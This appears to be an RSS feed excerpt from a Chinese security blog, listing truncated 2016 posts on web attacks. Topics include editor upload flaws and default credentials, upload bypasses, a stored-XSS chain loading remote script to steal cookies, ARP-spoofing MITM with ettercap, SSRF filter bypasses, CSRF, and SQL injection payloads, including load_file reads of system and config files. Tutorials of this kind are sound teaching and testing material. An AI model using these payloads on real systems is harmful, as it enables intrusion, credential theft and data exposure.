1、敏感信息暴漏 * 查看版本信息 /FCKeditor/editor/dialog/fck_about.html * 默认上传页面 /FCKeditor/editor/filemanager/browser/default/browser.html /FCKeditor/editor/filemanager/browser/default/connectors/test.html /FCKeditor/editor/filemanager/upload/test.html /FCKeditor/editor/filemanager/connectors/test.html /FCKeditor/editor/filemanager/connectors/uploadtest.html * 其他敏感文件 /FCKeditor/editor/filemanager/connectors/aspx/connector.html /FCKeditor/editor/filemanager/connectors/asp/connector.html /FCKeditor/editor/filemanager/connectors/php/connector.php 2、黑名单策略错误 FCKeditor&amp;lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名 3、任意文件上传漏洞 FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行， 在form中的action=&amp;quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&amp;quot; 即可，然后上传  0x02 eWebEditor 1、默认后台 2.80以前为：ewebeditor/admin_login.asp 2.80以后为：admin/login.asp 2、默认账号密码 admin admin888 3、数据库地址 默认数据库地址 ewebeditor/db/ewebeditor.mdb 常用数据库地址 ewebeditor/db/ewebeditor.asa ewebeditor/db/ewebeditor.asa ewebeditor/db/#ewebeditor.asa ewebeditor/db/#ewebeditor.mdb ewebeditor/db/!@#ewebeditor.asp ewebeditor/db/ewebeditor1033.mdb asp asa为后缀的数据库下载下来后改为mdb  
Reference(侵删)：  http://navisec.it/编辑器漏洞手册/  </description>
    </item>
    
    <item>
      <title>文件上传漏洞常见绕过手法</title>
      <link>https://wyb0.com/posts/2016/file-upload-simple-to-bypass/</link>
      <pubDate>Wed, 20 Jul 2016 17:04:44 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/file-upload-simple-to-bypass/</guid>
      <description>0x00 一般防止上传漏洞手法 1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证 //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少 //服务器开销，而服务端验证才可以真正防御攻击者。 2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法  0x01 客户端检测 客户端验证代码形如下：
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;图片上传&amp;lt;/title&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; function checkFile(){ var flag = false; var str = document.getElementById(&amp;quot;file&amp;quot;).value; str = str.substring(str.lastIndexOf(&#39;.&#39;) + 1); var arr = new Array(&#39;png&#39;,&#39;bmp&#39;,&#39;gif&#39;,&#39;jpg&#39;); for (var i=0;i&amp;lt;arr.length;i++){ if(str==arr[i]){ flag = true; } } if(!flag){ alert(&#39;文件不合法！&#39;); } return flag; } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;quot;upload.php&amp;quot; method=&amp;quot;post&amp;quot; onsubmit=&amp;quot;checkFile()&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot; name=&amp;quot;submit&amp;quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  接收文件的脚本upload.</description>
    </item>
    
    <item>
      <title>文件上传漏洞与文件解析漏洞</title>
      <link>https://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/</link>
      <pubDate>Wed, 20 Jul 2016 11:30:53 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/</guid>
      <description>0x00 文件上传漏洞 当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的 脚本文件时，就有可能控制整个网站甚至是服务器，这就是文件上传漏洞。 # 上传后得到的权限 1. 后台权限：登陆了后台，可以进行一些操作、配置 2. 网站权限：获得了webshell，可以进行查看源代码等操作 3. 服务器权限：可以对服务器进行任意操作  0x01 文件上传漏洞分类 1. 配置不当可直接上传shell HTTP的PUT方法开启了 2. 文件解析漏洞导致文件执行 Web容器解析漏洞 3. 本地文件上传限制被绕过 BurpSuite抓包修改即可绕过 4. 服务端过滤不严或被绕过 使用了黑名单过滤 5. 文件路径截断上传 00截断等 6. 开源编辑器上传漏洞 如CKEditor(FCKeditor的新版)、eWebEditor的漏洞  0x02 文件上传漏洞利用条件 1. 首先,上传的文件能够被web容器解释执行。所以文件上传后的目录要是web容器所覆盖到的路径 2. 其次,用户能从web访问这个文件 3. 最后,用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容,则可能导致攻击失败  0x03 文件上传漏洞挖掘 1. 查找上传点，如图片、附件、头像的上传等 2. 找类似upload的目录、类似upload.php的文件 3. 找编辑器目录，如eWebEdirot、fckeditor、kingeditor等  0x04 常见可执行文件后缀 可用于绕过： php php2 php3 php5 phtml asp aspx ascx ashx cer asa jsp jspx jspf  0x05 解析漏洞 文件上传漏洞通常与Web容器的解析漏洞配合利用 常见Web容器有IIS、Nginx、Apache、Tomcat等  0x06 IIS解析漏洞 IIS6.</description>
    </item>
    
    <item>
      <title>一次存储型XSS利用实例</title>
      <link>https://wyb0.com/posts/2016/recording-an-stored-xss/</link>
      <pubDate>Sun, 17 Jul 2016 23:30:54 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/recording-an-stored-xss/</guid>
      <description> 首先感谢凯神的指导
0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可：
&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a  但是这个要在点击删除时payload才起作用 也可用&amp;lt;img src=1 onerror=alert(1) /&amp;gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js  0x03 加载自己的js  此时的限制条件为：  * 30个字符 * script标签不能自己触发   只能构造类似下面的语句自己加载脚本：  a=document.createElement(&#39;script&#39;); a.src=&amp;quot;www.xxx.com&amp;quot;; document.head.appendChild(a);   可以用如下方法分割，多次添加：  a=document.createE/* */lement(&#39;script&#39;);/* */a.src=&amp;quot;www.xxx.com&amp;quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行   查找  构造payload   使用如下payload： &amp;lt;svg/onload=&amp;quot;b=&#39;http://t.i&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;b+=&#39;m/16ap6&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;$loadJs(b)&amp;quot;&amp;gt;  0x04 得到Cookie </description>
    </item>
    
    <item>
      <title>XSS漏洞及其挖掘方法</title>
      <link>https://wyb0.com/posts/2016/xss-basis-and-use/</link>
      <pubDate>Fri, 15 Jul 2016 10:30:54 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/xss-basis-and-use/</guid>
      <description>0x00 简介 XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;rdquo;脚本&amp;rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
0x01 危害 JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
• 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等  0x02 攻击场景 在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等  0x03 分类 主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。
 反射型XSS
  反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
简单流程： 1. 用户访问带有XSS代码的URL请求 2. 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 3. 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： 1. 用户aaa在网站www.xxx.com浏览网页 2. 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 3. 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com 4. hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 5. 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com 6. hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息   存储型XSS
  存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</description>
    </item>
    
    <item>
      <title>无线下ettercap做中间人攻击</title>
      <link>https://wyb0.com/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</link>
      <pubDate>Wed, 13 Jul 2016 09:22:39 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</guid>
      <description> 前提：攻击主机和被攻击主机在一个无线下面
0x00 打开ettercap 0x01 查看host列表 在软件的图形化界面点击sniff，选择unified sniffing选择网卡，然后单击hosts选项，选择scan for host，然后选择host list 0x02 选定攻击目标 选择192.168.1.116的IP地址，点击Add to Target 1,然后选择网关的IP地址192.168.1.1，点击Add to Target 2 0x03 开始攻击 ettercap选择&amp;quot;mitm&amp;quot;—&amp;quot;arp poisoning&amp;quot;—&amp;quot;Sniff remote connections&amp;quot;— &amp;quot;确定&amp;quot;，然后再在被攻击端查看arp，可知攻击已经成功 0x04 ettercap持续监听目标 软件上开始监听，被攻击端用浏览器登录路由器 0x05 得到Cookie 点击主界面的&amp;rdquo;View&amp;rdquo; — &amp;ldquo;connetcions&amp;rdquo; 可以查看被攻击主机的一些网络链接 0x06 用cookie登陆被入侵账户 打开火狐浏览器，通过firebug插件添加截获到的cookie从而登陆账户 </description>
    </item>
    
    <item>
      <title>SSRF</title>
      <link>https://wyb0.com/posts/2016/ssrf/</link>
      <pubDate>Thu, 30 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ssrf/</guid>
      <description>0x00 什么是SSRF SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。
当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。
0x01 SSRF的危害 可以扫描内部网络
可以构造数据攻击内部主机
0x02 漏洞挖掘 其实只要能对外发起网络请求就有可能存在SSRF漏洞。
1. 从WEB功能上寻找 通过URL分享内容 文件处理、编码处理、转码等服务 在线翻译 通过URL地址加载与下载图片 图片、文章的收藏 设置邮件接收服务器 2. 从URL关键字寻找 share、wap、url、link、src、source、target、u、3g、 display、sourceURl、imageURL、domain...  0x03 漏洞验证 http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png 1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png， 说明不存在SSRF漏洞。 2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png 这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。  0x04 绕过过滤 有时漏洞利用时会遇到IP限制，可用如下方法绕过：
* 使用@：http://A.com@10.10.10.10 = 10.10.10.10 * IP地址转换成十进制、八进制：127.0.0.1 = 2130706433 * 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx * 端口绕过：ip后面加一个端口 * xip.io：10.0.0.1.xip.io = 10.0.0.1 www.10.0.0.1.xip.io = 10.0.0.1 mysite.10.0.0.1.xip.io = 10.0.0.1 foo.bar.10.0.0.1.xip.io = 10.0.0.1 * 通过js跳转  0x05 通用的SSRF实例  weblogin配置不当，天生ssrf漏洞 discuz x2.</description>
    </item>
    
    <item>
      <title>sqlmapapi的简单使用</title>
      <link>https://wyb0.com/posts/2016/sqlmapapi-usage/</link>
      <pubDate>Tue, 28 Jun 2016 11:19:11 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/sqlmapapi-usage/</guid>
      <description>0x00 关于sqlmapapi.py 当利用sqlmap时一次只能测试一个url，效率很低，而用sqlmapapi就可以实现批量
0x01 用于交互的方法 在sqlmap/lib/utils/api.py中:
# 用户方法 @get(&amp;quot;/task/new&amp;quot;) Create new task ID. @get(&amp;quot;/task/&amp;lt;taskid&amp;gt;/delete&amp;quot;) Delete own task ID. # 管理函数 @get(&amp;quot;/admin/&amp;lt;taskid&amp;gt;/list&amp;quot;) List task pull. @get(&amp;quot;/admin/&amp;lt;taskid&amp;gt;/flush&amp;quot;) Flush task spool (delete all tasks). # 核心交互函数 @get(&amp;quot;/option/&amp;lt;taskid&amp;gt;/list&amp;quot;) List options for a certain task ID @post(&amp;quot;/option/&amp;lt;taskid&amp;gt;/get&amp;quot;) Get the value of an option (command line switch) for a certain task ID @post(&amp;quot;/option/&amp;lt;taskid&amp;gt;/set&amp;quot;) Set an option (command line switch) for a certain task ID @post(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/start&amp;quot;) Launch a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/stop&amp;quot;) Kill a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/status&amp;quot;) Return status of a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/data&amp;quot;) Retrieve the data of a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/log/&amp;lt;start&amp;gt;/&amp;lt;end&amp;gt;&amp;quot;) Retrieve a subset of log messages @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/log&amp;quot;) Retrieve the log messages @get(&amp;quot;/download/&amp;lt;taskid&amp;gt;/&amp;lt;target&amp;gt;/&amp;lt;filename:path&amp;gt;&amp;quot;) Download a certain file from the file system  0x02 sqlmapapi.</description>
    </item>
    
    <item>
      <title>CSRF漏洞</title>
      <link>https://wyb0.com/posts/2016/csrf/</link>
      <pubDate>Tue, 28 Jun 2016 09:21:34 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/csrf/</guid>
      <description>0x00 概念 当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。
CSRF就是：攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾认证过的网站并执行某些操作。也可以说CSRF就是黑客利用受害者的Cookie骗取服务器的信任从而执行某些操作
0x01 利用  利用条件
 攻击者可以得知url的所有参数项并了解其含义 诱导用户访问构造好的POC  利用地方
 操作是有意义的(比如:修改密码等) 验证过于简单(参数固定、我们可以设置参数)   0x02 GET型CSRF攻击 若有论坛www.aa.com，论坛删除文章的操作是请求类似 http://www.aa.com/opt.php?id=135&amp;amp;act=del&amp;amp;name=Tom的链接  有用户A，他登陆了论坛，且有篇文章id为251，那么他的浏览器此时已经取得了论坛的信任  此时有hacker用户B，他构造了一个html为b.html，b.html内容如下： &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;img src=&amp;quot;http://www.aa.com/opt.php?id=251&amp;amp;act=del&amp;amp;name=A&amp;quot; /&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 将b.html放在他自己搭建的网站上，网址为http://www.bb.com/b.html  恶意用户B将链接http://www.bb.com/b.html通过qq发送给用户A， 诱使他访问，用户A一旦访问，他id为251的文章就会被删除  0x03 POST型CSRF攻击 若网站www.xx.com有让用户修改密码的功能，但验证过于简单，形如下图： &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;aa&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;quot;http://172.23.10.200/setpasswd.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt; 昵称：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;nickname&amp;quot; id=&amp;quot;nickname&amp;quot; value=&amp;quot;xxxxx&amp;quot;&amp;gt; 用户名：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;name&amp;quot; id=&amp;quot;name&amp;quot; value=&amp;quot;xiaoming&amp;quot;&amp;gt; 密码：&amp;lt;input type=&amp;quot;passwd&amp;quot; name=&amp;quot;passwd&amp;quot; id=&amp;quot;passwd&amp;quot; value=&amp;quot;&amp;quot;&amp;gt; 确认密码：&amp;lt;input type=&amp;quot;rpasswd&amp;quot; name=&amp;quot;rpasswd&amp;quot; id=&amp;quot;rpasswd&amp;quot; value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;button&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  此时我们就可以构造自动提交表单的xxxx.</description>
    </item>
    
    <item>
      <title>SQL注入之防御</title>
      <link>https://wyb0.com/posts/2016/injection-of-defense/</link>
      <pubDate>Sat, 25 Jun 2016 10:25:11 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-defense/</guid>
      <description>0x00 要做的事 也就是找到注入点然后修复
0x01 防御方法  使用预编译语句绑定变量(比如php的mysqli、pdo)
&amp;lt;?php //预编译 $mysqli = new mysqli(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;123456&amp;quot;,&amp;quot;share&amp;quot;); $mysqli-&amp;gt;query(&amp;quot;set names utf8&amp;quot;); $sql = &amp;quot;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;quot;; $s = $mysqli-&amp;gt;prepare($sql); //绑定参数 $name = &amp;quot;Tom&amp;quot;; $sex = &amp;quot;M&amp;quot;; $age = 23; $s-&amp;gt;bind_param(&amp;quot;ssi&amp;quot;,$name,$sex,$age);//ssi的意思是字符、字符、整型 //执行 $result = $s-&amp;gt;execute(); var_dump($result); $s-&amp;gt;close(); ?&amp;gt;  使用存储过程(这里以SQLServer举例)
  --如果存在名为get_student_msg(相当于函数)的存储过程则删除 IF EXISTS (SELECT name FROM sysobjects WHERE name=&#39;get_student_msg&#39; AND type=&#39;p&#39;) DROP PROCEDURE get_student_msg CREATE PROCEDURE get_student_msg --创建存储过程 @name VARCHAR(20) --声明全局变量 AS BEGIN SELECT * from info WHERE name=@name END GO --创建好存储过程后在其他地方直接使用函数并传参就行了 EXEC get_student_msg &#39;xiaoli&#39;   使用转义函数</description>
    </item>
    
    <item>
      <title>SQL注入之宽字节注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-wide-byte/</link>
      <pubDate>Fri, 24 Jun 2016 15:32:34 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-wide-byte/</guid>
      <description>0x00 应用场景 在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&amp;quot;\&amp;quot;转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。
0x01 测试代码 &amp;lt;?php $conn = mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;); mysql_select_db(&#39;messages&#39;,$conn); if (isset($_GET[&#39;id&#39;])) { $id = addslashes($_GET[&#39;id&#39;]); //转义id $sql = &amp;quot;select * from msg where id=&#39;$id&#39;;&amp;quot;; echo $sql.&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $result = mysql_query($sql); $rows = @mysql_fetch_assoc($result); if ($rows) { echo &#39;&amp;lt;table align=&amp;quot;left&amp;quot; border=&amp;quot;1&amp;quot;&amp;gt;&#39;; foreach ($rows as $key =&amp;gt; $value) { echo &#39;&amp;lt;tr align=&amp;quot;lift&amp;quot; height=&amp;quot;30&amp;quot;&amp;gt;&#39;; echo &#39;&amp;lt;td&amp;gt;&#39;.$key.&#39;----&#39;.$value.&#39;&amp;lt;/td&amp;gt;&#39;; echo &#39;&amp;lt;/tr&amp;gt;&#39;; } echo &#39;&amp;lt;/table&amp;gt;&#39;; } else { echo mysql_error(); } } else { echo &amp;quot;please input id.</description>
    </item>
    
    <item>
      <title>SQL注入之基于时间的注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-time-based/</link>
      <pubDate>Fri, 24 Jun 2016 10:10:27 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-time-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。 其实只要存在SQL注入就可以使用基于时间的盲注，利用范围比较广泛，但是可能受到网络带宽等因素的影响。  0x01 利用方式 整型注入的话可以直接: ?id=if(1=1,sleep(2),1) 字符型的话需要闭合: ?id=2&#39; and if(1=1,sleep(2),1) and &#39;1  0x02 相关函数  if(条件, 值1, 值2)
当条件为真时返回值1，条件为假时返回值2
 sleep()
sleep(2)睡眠两秒
 benchmark(count, expr)
benchmark是用于测试函数性能的，它是将表达式expr执行count次，执行次数越多耗费时间越久
  0x03 基于时间的注入payload mysql&amp;gt; select if((select database()) like &amp;quot;rte%&amp;quot;,sleep(2),666); +---------------------------------------------------+ | if((select database()) like &amp;quot;rte%&amp;quot;,sleep(2),666) | +---------------------------------------------------+ | 0 | +---------------------------------------------------+ 1 row in set (2.00 sec) mysql&amp;gt; select if((select database())=&amp;quot;rteaaa&amp;quot;,sleep(2),666); +-----------------------------------------------+ | if((select database())=&amp;quot;rtest1&amp;quot;,sleep(2),666) | +-----------------------------------------------+ | 666 | +-----------------------------------------------+ 1 row in set (0.</description>
    </item>
    
    <item>
      <title>SQL注入之布尔型注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-boolian-based/</link>
      <pubDate>Thu, 23 Jun 2016 23:32:34 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-boolian-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位，且没有用echo &amp;quot;mysql_error()&amp;quot;输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用  0x01 利用方式 用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+ 根据返回页面是否相同来得到数据  0x02 注入步骤  找到注入点，判断闭合字符  尝试猜解列数，得到显示位  得到数据库名 最终得到第五个数据库名为security
 得到表名 最终依次猜的表名为users
 得到列名 同理最终得到第2列列名为username，第3列列名为password
 得到列值 依次得到为admin4，同理可得其他数据
  0x04 附上python脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber &amp;lt;1070018473@qq.com&amp;gt; __author__=&amp;quot;reber&amp;quot; import sys import requests import binascii import hashlib from pyfiglet import figlet_format from optparse import OptionParser def get_md5_html(url): html = requests.</description>
    </item>
    
    <item>
      <title>SQL注入之报错型注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-error-based/</link>
      <pubDate>Wed, 22 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-error-based/</guid>
      <description>0x00 前提 一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解  0x01 利用方式 报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):
?id=2&amp;rsquo; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+
?id=2&amp;rsquo; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+
?id=1&amp;rsquo; and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+
第一个公式具体原理可以参考：MySQL报错注入原理分析(count()、rand()、group by)
0x02 公式解析 floor()是取整数 rand()在0和1之间产生一个随机数 rand(0)*2将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*)是用来统计结果的，相当于刷新一次结果 group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1 group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次  0x03 注入步骤  猜测闭合字符  猜测列数  尝试得到显示位  报错得到数据库个数  报错得到数据库名  报错得到表名  报错得到列名  得到列值   0x04 附上利用代码 #!</description>
    </item>
    
    <item>
      <title>SQL注入之联合查询(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-union-select/</link>
      <pubDate>Tue, 21 Jun 2016 22:30:18 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-union-select/</guid>
      <description> 0x00 前提 要用联合查询进行注入则：页面必须有显示位
0x01 联合查询 union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同
0x02 注入步骤  找到注入点得到闭合字符  判断数据库类型  猜解列数，得到显示位(从数据库中查询出来的数据有些会显示在页面中，显示的位置就是显示位)  得到基本信息(数据库名、版本、数据库版本等)  得到数据库  得到security数据库的表名  猜解列名  猜解数据   </description>
    </item>
    
    <item>
      <title>SQL注入之load_file和into outfile(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-mysql-function/</link>
      <pubDate>Mon, 20 Jun 2016 08:10:27 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-mysql-function/</guid>
      <description>0x00 load_file() 读文件  条件:  1. 要有file_priv权限: show global variables like &#39;%secure%&#39;; 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
 读/etc/init.d下的东西，这里有配置文件路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)  得到web安装路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)  读取密码文件
?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)    0x01 load data local infile 读文件  条件:  MySQL8 中需要 SET GLOBAL local_infile=1;   语句  LOAD DATA LOCAL INFILE &#39;D:/pet.txt&#39; INTO TABLE pet FIELDS TERMINATED BY &#39;&#39;; select * from pet;  0x02 into outfile getshell  条件：  1.</description>
    </item>
    
    <item>
      <title>SQL注入</title>
      <link>https://wyb0.com/posts/2016/injection/</link>
      <pubDate>Sun, 19 Jun 2016 20:18:48 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection/</guid>
      <description>0x00 含义 sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，
总结起来就是攻击者将恶意代码拼接到sql语句并加以执行从而得到数据的过程。
0x01 成因 SQl语句未对用户参数进行严格过滤
0x02 可引发注入的地方 其实只要是客户端可控、参数值代入数据库查询的地方都可能存在注入，常见的如下，按出现频率排序：
 GET POST X-Forwarded-For Cookie User-Agent  0x03 注入分类  根据语法(较权威)
 UNION query SQL injection(可联合查询注入)
只要页面有显示位即可使用，且注入速度很快 Error-based SQL injection(报错型注入)
没有显示位但用echo &amp;ldquo;mysql_error()&amp;ldquo;输出了错误信息，速度很快，但是语句较复杂 Boolean-based blind SQL injection(布尔型注入)
一次一个字节，速度慢，但只要有注入就能用 Time-based blind SQL injection(基于时间延迟注入)
超级慢，比布尔型注入慢几倍，但是通用性较强 Stacked queries SQL injection(堆叠注入)
只有SQL Server可以使用(可多语句查询注入)  根据类型
 整形
形如&amp;quot;a.asp?ID=55&amp;quot;，这类注入的参数是&amp;rdquo;数字&amp;rdquo;，因此称为&amp;rdquo;数字型注入点&amp;rdquo;。 字符串型
形如&amp;quot;b.asp?name=xiaoming&amp;quot;这类注入的参数是&amp;rdquo;字符&amp;rdquo;，称为&amp;rdquo;字符型&amp;rdquo;注入点。
 搜索型
指在进行数据搜索时没过滤搜索参数，直接通过搜索框表单提交。
   0x04 查找注入点  在URL中
 and 1=1/and 1=2(整型) 随即输入(整型) -1/+1 回显上下页面(整型) 单引号(字符型/整型) and sleep(5) (判断页面返回时间)  在http头</description>
    </item>
    
    <item>
